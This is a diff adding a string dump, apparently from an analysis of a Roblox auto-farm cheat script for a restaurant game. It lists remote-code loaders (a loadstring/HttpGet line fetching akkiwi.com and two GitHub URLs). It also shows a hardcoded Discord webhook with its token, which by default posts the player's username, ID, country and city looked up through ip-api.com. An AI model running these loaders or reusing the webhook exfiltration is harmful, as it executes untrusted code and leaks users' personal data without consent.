@@ -1,0 +1,984 @@
+==== LOADSTRINGS (scripts externes chargés par faf) ====
+
+1) Interface, chargée au démarrage (fonction 0) :
+   loadstring + HttpGet sur
+   https://raw.githubusercontent.com/csgo1compte-cloud/RayVoid/refs/heads/main/AirFlow
+
+2) Module Fleet (fonction 0.42, qui référence aussi "readfile" et "Fleet.lua") :
+   loadstring + HttpGet sur
+   https://raw.githubusercontent.com/csgo1compte-cloud/RayVoid/refs/heads/main/Fleet
+
+3) Rechargement automatique après téléportation (fonction 0.36.2, via queue_on_teleport).
+   Cette chaîne figure telle quelle dans le script :
+   loadstring(game:HttpGet("https://akkiwi.com/h"))()
+
+Note : pour 1) et 2), le script ne contient pas la ligne complète sous forme de texte ;
+les constantes "loadstring", "HttpGet" et l'adresse sont côte à côte dans la même fonction.
+
+==== TOUTES LES CHAÎNES (ordre alphabétique) ====
+
+\n
+ (
+ (next 
+ (next ₱
+ accepted
+ fired
+ is already taken
+ item(s) bought
+ item(s) in stock
+ item(s) placed
+ min
+ pack(s) bought
+ purchases
+ queued
+ refused (
+ rejected
+ tier)
+ unlocked!
+ · 
+ · max level
+ ×
+ — 
+ — check the URL
+ — ₱
+ ₱
+ → 
+!
+!%Y-%m-%dT%H:%M:%SZ
+%.1fk
+%.1fM
+%.4gk
+%.4gM
+%1 
+%D
+%H:%M:%S
+%s ₱%s (%d)
+%s ₱%s (%s)
+%s ₱%s (x%d)
+%s+
+(%d%d%d)
+)
+) 
+-
+/3)
+/api/webhooks/
+123456789012345678
+127231ebbd0bd6d659abcb04322996931e0a068d4525ce543b33a04bbdfbc000
+28ddb9f5c6345419f2bf52ddc60b12d86917a79b0f118522505e53750de2041f
+35b5d35ae460382a764d228120d6575b3b2d17470b87e8d31e05737a60136b32
+428c1c1fbe8df0566e78fc7d39a35f3ecaf002778a884c3314a387b96eac8628
+5308ddcad07391c12338bee332f14c48329e15bb79f867543d2e70515a488a41
+55a8e8f222e3b4f3b3b7e13e9f7744798c7b44b5edaeadf8a8a92b45bebbccef
+7c381ac1e7433dc7ef5625d161f08a233d3abce270a82c08cd4191ae70d8e6c9
+8617ede84b9b307d4b7cf6cf9eb51c55df9a6572fea4e2449a7b1e36ea9a889c
+866acd8dc2deb0aaa5655fb85276f851038dacded1fa576fb6231b7630be31ae
+91275f8029199bfd2dc83ce25046d9a298f28ab6ec1224c57f57ea8be708e527
+97325a98f5bb4ba359c37e8307c115cc6a6381512d76fdfc970f44608b1ed4ff
+9ad2f0c30483dd74345b0ebf36ee98f31f0153a1c213c6ebe63334f356ced992
+9c161ee46b750907b29c7271bdf55244c4816dd2e6451536d68488ae95a6cda6
+9e6c45c8735bcd0197698c9fd5b10bcd3cc19f1bb1e6f12413fbc4285d7423dd
+: 
+<@
+>
+[AntiAFK] mouse1click failed: 
+[Karinderya] 
+[Karinderya] buy 
+^%s+
+^([^_]+)
+^Cooked_
+^DiningPlot
+^Karenderya
+^KitchenPlot
+^Serve
+^Table%d+$
+_
+__mode
+A message the moment a travelling merchant arrives, and what was bought from it
+A webhook is already configured and enabled. Player info is posted on load, and a logout log is posted when the scripter leaves. You can disable sending with the toggle below, or paste your own URL to redirect everything elsewhere.
+abs
+Accent
+Accept selected
+Accepts players who apply at your hiring sign while there is room
+ActionText
+Activate
+AdditionalOrder
+afk
+Airflow
+Aisle
+All
+AlwaysShow
+AncestryChanged
+Anchored
+anchored
+Anti-AFK
+Anti-AFK, menu key and configs
+Applicants
+Applicants: %d   ·   Staff: %d / %s
+application/json
+Applications
+ApplyTheme
+arrow-big-up
+assigned
+Assigned
+Assigner
+Assigner seats customers, Dishwasher washes, Server serves the 2nd floor
+AssignNPC
+attach
+Attachment
+Auto accept applicants
+Auto assign customers
+Auto buy
+Auto buy from Halaman
+Auto buy from merchant
+Auto buy ingredients
+Auto buy selected items
+Auto buy tables
+Auto collect trash
+Auto hire
+Auto kick runaways — outdated
+Auto place
+Auto place best furniture
+Auto reload
+Auto reload on teleport
+Auto restock
+Auto roll
+Auto serve drinks
+Auto serve food
+Auto unlock menus
+Auto upgrade counter
+Auto upgrade furniture
+Auto wake workers
+Auto wash dishes
+AutoLoad
+BackgroundColor3
+Backpack
+BasePart
+Beam
+bell
+best owned %s does not beat %s
+BindToClose
+Body
+BodyBackground
+BorderColor
+BorderColor3
+bought
+Bought 
+Bread
+BussingRemotes
+ButtonBackground
+ButtonHover
+ButtonPressed
+ButtonText
+Buy
+Buy Halaman selection now
+Buy merchant selection now
+Buy selected now
+BuyCounterUpgrade
+BuyFurniture
+BuyHalamanItem
+BuyIngredient
+BuyMerchant2Item
+BuyMerchantItem
+Buys every selected item as soon as it is in stock (spends cash)
+Buys every selected item in stock right now, ignoring Keep cash
+Buys every selected item in stock, ignoring Keep cash
+Buys every selected merchant item the moment the cart shows up (spends cash)
+Buys every selected pot and seed the moment the merchant shows up (spends cash)
+Buys one pack of each selected ingredient when its stock drops below the threshold
+Buys the next counter upgrade when none is running, then equips the best finished one (spends cash)
+Buys the next tier of tables, chairs and stoves until every slot has it, places it, then the next tier (spends cash, respects Keep cash)
+BuyTableEvent
+c746214c43c80b209b07d367d0c320323db432df3a693f4083eeaf8e3396ad3e
+Callback
+CanAfford
+CanCollide
+CanvasGroup
+CardBackground
+CardHeight
+Cash
+Cash now
+CastShadow
+Category
+CFrame
+ChairConfig
+Chairs
+Character
+chef-hat
+ChildAdded
+Chiller
+city
+City
+clamp
+Cleaning
+Cleans up trash around the map and throws it in your restaurant's bin
+clear
+clear_teleport_queue
+clearqueueonteleport
+ClientNPCs
+clock
+clone
+Color
+color
+Color3
+Columns
+Common
+concat
+Configs
+ConfigurationSaving
+Connect
+ContainerBackground
+Content
+content
+Content-Type
+ContentBackground
+Cost
+count
+Counter
+Counter 
+Counter %s · next %s for ₱%s
+Counter %s · upgrading to %s (%02d:%02d)
+Counter upgrade started
+Counter: —
+CounterActionResult
+CounterConfig
+CounterLevel
+CounterNPC
+CounterRemotes
+CounterUpgrades
+country
+Country
+CreateButton
+CreateCardGrid
+CreateConfigManager
+CreateDropdown
+CreateFilteredCardGrid
+CreateInput
+CreateKeybind
+CreateLabel
+CreateParagraph
+CreateSection
+CreateSlider
+CreateTab
+CreateToggle
+CreateWindow
+croissant
+Current cash, what changed since the last report, and the session counters
+CurrentBuilding
+CurrentTable
+CustomerRouteFolder
+Customers and serving
+d155f6dceb75f48e645755a281e0db6cad441d7dea54893d4d8ce8af07f2b39d
+d8c8e57bdafbb91b6d7c5423d94d30876f1aed7455e194de60305bafe541c178
+date
+Default
+defer
+Desc
+DescendantAdded
+description
+Dining
+DirtyDishSunk
+Disable 3D rendering
+Disconnect
+Discord notifications
+Discord user ID to ping
+Discord webhook
+Dishes
+Dishes and trash
+Dishwasher
+DisplayName
+DividerBackground
+DividerColor
+done
+drinks
+Drinks
+DropdownBackground
+DropdownListBackground
+Duration
+e5301c12c354e53377670da294bac7f48114607c6fcdb830feeefb8751f78b37
+e8aa5fac2fe5cb62ba8a1f213fabb79f8b5db5efb8187f339a52484813db309a
+Earned
+embeds
+EmptyText
+Enable webhook
+Enabled
+EnabledMenus
+encode failed
+EndTime
+Enum
+Epic
+EquipTool
+Error
+Event
+Every prompt in the game can be used from any distance, manual play included
+every slot has the best owned
+Exclude
+Exclusivity
+ExpansionConfig
+failed: 
+Failed: 
+farm
+fields
+FileName
+FilterDescendantsInstances
+FilterName
+FilterType
+find
+FindFirstChild
+FindFirstChildOfClass
+FindFirstChildWhichIsA
+Fire
+Fire selected
+fireproximityprompt
+FireServer
+FireStaff
+Flag
+Fleet.lua
+floor
+fluxus
+FolderName
+FoodConfig
+footer
+FooterBackground
+format
+FPS: 
+FPS: —
+Frame
+fromOffset
+fromRGB
+Furniture
+Furniture and decor
+Furniture, paints, materials and tiles bought from the shop
+FurnitureConfig
+FurnitureInventory
+game
+Garden
+Garden: this game version has no Halaman merchant
+General
+GenerateGUID
+GET
+Get
+GetAttribute
+GetAttributeChangedSignal
+GetChildren
+GetCost
+GetCounterInfo
+GetDescendants
+GetHalamanStock
+GetItemConfig
+GetMenuData
+GetMerchant2Stock
+GetMerchantStock
+GetPivot
+GetService
+GetShopInfo
+GetStaffInfo
+GetUnlockedTables
+GetWaitingWorkers
+Gives customers the softdrinks they order, buying a pack when out (needs the repaired chiller)
+GiveSoftdrink
+GlobalHalamanEvent
+GlobalMerchant2Event
+GlobalMerchantEvent
+GlobalShadows
+GlobalTrashSpawner
+Grocery
+GroceryCategory
+Group purchases over
+Groups
+groups
+gsub
+GuiButton
+Halaman
+Halaman here · 
+Halaman keep cash
+Halaman merchant
+Halaman merchant, pots and seeds
+Halaman: away — selections are kept for its next visit
+Halaman: —
+HasDishes
+HeaderBackground
+Headers
+HeaderText
+Heartbeat
+HighlightBackground
+Hire failed: 
+Hire workers and manage staff
+Hired 
+Hires the rarest wanted candidate (then least sleepy, then fastest) for every free role below (spends cash)
+HireWorker
+HoldDuration
+Hourly report
+HoverBackground
+How this works
+hrp
+http
+HTTP 
+http://ip-api.com/json/
+http_request
+HttpGet
+https://discord.com/api/webhooks/...
+https://discord.com/api/webhooks/1552922706159337582/ncOTVUXkdYrgY7raGyBbxWsuJEcn5mU_TBz8H8T1DmP_tNJ3m_tAGjb37tiD1Bmzz-z_
+https://raw.githubusercontent.com/csgo1compte-cloud/RayVoid/refs/heads/main/AirFlow
+https://raw.githubusercontent.com/csgo1compte-cloud/RayVoid/refs/heads/main/Fleet
+HttpService
+Humanoid
+humanoid
+HumanoidRootPart
+Icon
+IconColor
+ID
+Idle
+Image
+ImageButton
+ImageColor3
+ImageLabel
+Ingredient purchases
+Ingredient restocking
+Ingredients
+Ingredients to keep stocked
+IngredientsConfig
+inline
+InputBackground
+InputHoldBegin
+InputHoldEnd
+insert
+Interface
+InvokeServer
+ipairs
+IsA
+IsBuying
+isfile
+IsRepaired
+IsSleeping
+IsUpgrading
+IsWorker
+It's now a server check, it will be fixed.
+item
+Items
+JSONEncode
+Jump
+k
+Karinderya
+Karinderya is connected to this channel.
+Karinderya · 
+Karinderya · Ronmenu · 
+KarinderyaAntiAfk
+KarinderyaAutoAcceptStaff
+KarinderyaAutoAssign
+KarinderyaAutoBuy
+KarinderyaAutoBuyTables
+KarinderyaAutoCounter
+KarinderyaAutoDrinks
+KarinderyaAutoHalaman
+KarinderyaAutoHire
+KarinderyaAutoMenus
+KarinderyaAutoMerchant
+KarinderyaAutoPlace
+KarinderyaAutoReload
+KarinderyaAutoRoll
+KarinderyaAutoServe
+KarinderyaAutoShop
+KarinderyaAutoTrash
+KarinderyaAutoUpgradeFurniture
+KarinderyaAutoWake
+KarinderyaAutoWash
+KarinderyaBuyCards
+KarinderyaHalamanItems
+KarinderyaHalamanKeepCash
+KarinderyaHireMaxWage
+KarinderyaHireRarities
+KarinderyaHireRoles
+KarinderyaKeepCash
+KarinderyaKeepMenusEnabled
+KarinderyaLiteGraphics
+KarinderyaLogPlayerInfo
+KarinderyaLogPlayerLeave
+KarinderyaLongReach
+KarinderyaMaxRollCost
+KarinderyaMenuKey
+KarinderyaMerchantItems
+KarinderyaMerchantKeepCash
+KarinderyaNoRender
+KarinderyaRejectMissing
+KarinderyaRestockBelow
+KarinderyaShopItems
+KarinderyaShopKeepCash
+KarinderyaTrashPerTrip
+KarinderyaUpgradeKeepCash
+KarinderyaWebhookDigest
+KarinderyaWebhookEnabled
+KarinderyaWebhookGrocery
+KarinderyaWebhookInterval
+KarinderyaWebhookMerchant
+KarinderyaWebhookPing
+KarinderyaWebhookReport
+KarinderyaWebhookShop
+KarinderyaWebhookUpgrades
+KarinderyaWebhookUrl
+Keep all menus enabled
+Keep cash
+KeepOnScreen
+Key
+KeybindBackground
+kicked
+Kitchen
+Kola
+Label
+LayoutOrder
+leaderstats
+Leave blank to use the built-in webhook. Paste your own Discord URL to redirect logs
+Legendary
+Lerp
+Lighter graphics
+Lighting
+Limited
+Line
+List
+LoadConfig
+Loading the merchant…
+Loading the shop…
+loadstring
+loadstring(game:HttpGet("https://akkiwi.com/h"))()
+LocalPlayer
+Log player info on load
+Log when scripter leaves
+Long-range prompts
+lookAt
+LookVector
+lower
+Loyal
+Magnitude
+MainBackground
+match
+MaterialConfig
+Materials
+math
+Max
+max
+Max roll cost
+Max wage
+MaxActivationDistance
+MaxStaff
+MaxStock
+Menu key
+Menu unlocked
+MenuConfig
+MenuRemotes
+Menus
+Menus and counter
+Menus unlocked, counter upgrades and tables bought
+Menus: —
+Merchant
+Merchant here · 
+Merchant items
+Merchant keep cash
+Merchant2Remotes
+Merchant: away — selections are kept for its next visit
+Merchant: —
+MerchantConfig
+MerchantRemotes
+MeshPart
+Method
+Min
+min
+MinSize
+Minutes between cash reports
+Model
+Models
+ModifyTheme
+Module
+Modules
+mouse1click
+MoveTo
+Multi
+Mythical
+Name
+name
+NavigationBackground
+Never buy a counter upgrade or a table if it would drop your cash below this
+Never buy if it would drop your cash below this
+new
+next
+Next restock in %02d:%02d
+nextName
+Nickname
+No applicant
+No candidate selected
+No player staff
+No stock left.
+Nobody
+not checked yet
+Nothing is sent while this is off
+nothing sent yet
+NotificationBackground
+Notify
+NPCArrivedAtSpot1
+NpcId
+NPCRemotes
+NPCSeated
+OnCardCreated
+OnChanged
+OnClientEvent
+One pass over the selected ingredients, ignoring the threshold
+One pass right now; also retries items that were refused before
+Only candidates of these rarities are hired; the role is chosen at hire time
+OpenButton
+Optional. Your numeric Discord ID, so every message mentions you
+Options
+order
+Order
+ordered
+OriginalItemName
+os
+Others
+Otherwise the customer waits until the ingredients are restocked
+Outline
+OutlineColor
+Override accepted
+Owned
+owned
+Owner
+package
+PaintConfig
+Paints
+pairs
+PanelBackground
+Parent
+ParticleEmitter
+Pays to spawn a new set of candidates now
+pcall
+Performance
+Periodic cash report
+Pieces picked up before a trip to the bin
+PisoSaleTiles
+pivot
+PivotTo
+Place best now
+PlaceFurnitureEvent
+Placeholder
+PlaceholderColor
+PlaceholderColor3
+PlaceholderText
+PlantConfig
+PlantRemotes
+Player info
+Player information
+Player staff
+Player staff: —
+PlayerGui
+PlayerRemoving
+Players
+PointLight
+points
+PopupBackground
+Position
+POST
+PostEffect
+Posts it immediately, even if the toggle above is off
+Posts one message right now so you can check the URL
+Posts the same details titled 'Scripter logged out' when you leave, disconnect, get kicked, or close the game
+Posts your Roblox username, nickname, ID, country, city and cash once the webhook is enabled
+Pots
+Pots and seeds
+presets
+Price
+price
+PromptPart
+PropEquipEvent
+ProximityPrompt
+ProximityPromptExclusivity
+Purchase
+Purchases are collected and sent as one digest this often
+putBack
+Puts your best tables, chairs and stoves (most stars, then price) wherever they beat what is placed
+QuaternaryBackground
+queue_on_teleport
+queueonteleport
+Rare
+Rarities to hire
+Rarity
+Raycast
+RaycastFilterType
+RaycastParams
+Reach
+readfile
+refused
+Reject if ingredients missing
+Reject selected
+RejectNPC
+Reloads the script by itself after a server hop or rejoin
+Remotes
+remove
+Remover
+RenderFidelity
+Repair the softdrink chiller first
+ReplicatedStorage
+Report every
+request
+request error: 
+RequestId
+require
+Required
+RequiredIngredients
+Requirement
+RespectCanCollide
+RespondApplication
+Restock below
+Restock everything now
+Restock: —
+RetryAfter
+reverse
+RightControl
+Roblox user
+Roles to fill
+Roll
+Roll new candidates
+Roll ₱
+Rolled
+RollWorker
+RON MENU | KARINDERYA
+RonHub/fleet.json
+Ronmenu
+Runaways
+RunService
+SaveConfig
+Score
+score
+ScreenGui
+Scripter logged out
+ScrollBarBackground
+ScrollBarImageColor
+ScrollBarImageColor3
+ScrollingFrame
+Seats the customer at the counter on the first free table (the stove then cooks by itself)
+SecondaryBackground
+Secret
+SectionBackground
+Seeds
+select
+Select what Auto buy grabs. Name, price and stock left. Bought furniture goes to your inventory.
+Select what to grab when the cart arrives. Furniture here goes up to 4 stars; weapons and bread are for runaway customers.
+Select what to grab when the merchant arrives. Rarer seeds mean fewer runaways and bigger shiny tips.
+Selected cards are restocked. Softdrinks need the repaired chiller.
+SelectedTab
+SelectionBackground
+Send a test message
+Send player info now
+sent %d embed(s) at %s
+Separator
+SeparatorBackground
+Serve
+served
+Served
+Served %d · every menu unlocked
+Served %d · next menu %s at %d
+Server
+Serving
+Set
+Set a valid webhook URL first
+Set3dRenderingEnabled
+SetColors
+SetGroups
+SetItems
+SetKeybind
+setmetatable
+SetPalette
+SetScriptName
+SetTheme
+Settings
+settings
+Shop
+Shop items
+Shop purchases
+shopping-cart
+ShopRemotes
+ShopRestocked
+Shows or hides this window
+SidebarBackground
+Simulates a left click every 60s to prevent the AFK kick
+Sink
+Size
+SleepChance
+SliderBackground
+SliderFill
+SliderOff
+SliderOn
+Smoke
+SoftdrinkOrdersUpdated
+Softdrinks
+sort
+sparkles
+Sparkles
+spawn
+Speed
+speed
+Sponge
+SpotLight
+sprout
+Staff
+StaffRemotes
+Stars
+Status
+Status: 
+Status: configured but disabled
+Status: no webhook URL set
+Status: this executor has no HTTP request function
+Status: —
+StatusCode
+Steamer
+Step
+Stock
+Stock level that triggers a purchase
+Stops drawing the world (screen goes blank, the UI stays). The game keeps running, so farming is unaffected. Biggest FPS and GPU saving — ideal for AFK. Rejoin restores it if the window is lost
+store
+StoveConfig
+Stoves
+string
+sub
+SubText
+Subtitle
+Success
+Suffix
+Suprise
+SurfaceLight
+syn
+System
+SystemType
+TabBackground
+table
+Table
+Table unlocked
+Table7
+TableAction
+TableConfig
+Tables
+Tables: —
+TabSelected
+TabSelectedBackground
+task
+Terrain
+TertiaryBackground
+Test message
+Text
+text
+TextBox
+TextButton
+TextColor
+TextColor3
+TextLabel
+That is not a Discord webhook URL
+The Halaman merchant is here
+The merchant is here
+The plant merchant is here
+The scripter has left the game.
+The travelling merchant is here
+Theme
+This executor has no HTTP request function
+Throw
+TileConfig
+Tiles
+time
+timestamp
+Title
+title
+TitleBackground
+Titlebar
+TitleText
+To2nd
+ToggleBackground
+ToggleDisabled
+ToggleEnabled
+ToggleMenu
+ToggleOff
+ToggleUIKeybind
+tonumber
+Tool
+TooltipBackground
+tostring
+total
+Total spent
+TotalServed
+Trail
+trash
+Trash
+Trash per trip
+TrashCan
+TrashOutside
+TrashPrompt
+Travelling merchant
+Turns back on any unlocked menu that is disabled
+Turns off shadows, particles, lights and post effects and simplifies meshes; switching off restores everything
+type
+Type
+UDim2
+UIStroke
+Unit
+Unknown
+Unlocked
+Unlocked 
+UnlockedMenus
+UnlockMenu
+Unlocks each menu as soon as you have served enough customers (free)
+Unlocks the next locked table (7-12) on your plot as soon as you can afford it above Keep cash
+unpack
+Update
+UpdateRate
+UpdateTheme
+Upgrade
+UpgradeCounter
+Upgrades
+Upgrading to 
+Upstairs tables: %d/6 unlocked · next %s for ₱%d
+Upstairs tables: all 6 unlocked
+Url
+user
+UserId
+username
+users
+utensils
+Value
+value
+Vector2
+Vector3
+ViewportFrame
+Wage
+wait
+WaitForChild
+Wakes up your sleeping workers; brings one out of range over to you (needs the Pan, same as the runaways)
+WakeWorkerEvent
+Walks to every cooked plate, picks it up and delivers it to its table
+WalkSpeed
+warn
+Warning
+Wash
+washed
+Washed
+Washes at your sink whenever it has dirty dishes
+WashNPC
+WaterReflectance
+WaterWaveSize
+WaterWaveSpeed
+Weapons
+Webhook
+Webhook URL (optional override)
+What the grocery auto-buy bought, with quantities and prices
+What to send
+When a role is free and no candidate fits, pays to spawn new candidates (at most every 15s)
+Window
+WindowBackground
+WorkerConfig
+WorkerPlot
+WorkerRemotes
+Workers
+Workspace
+X
+x
+Y
+Your executor has no queue_on_teleport
+Your staff
+Z
+zero
+• 
+• %s ×%d — ₱%s
+• Bread ×
+₱
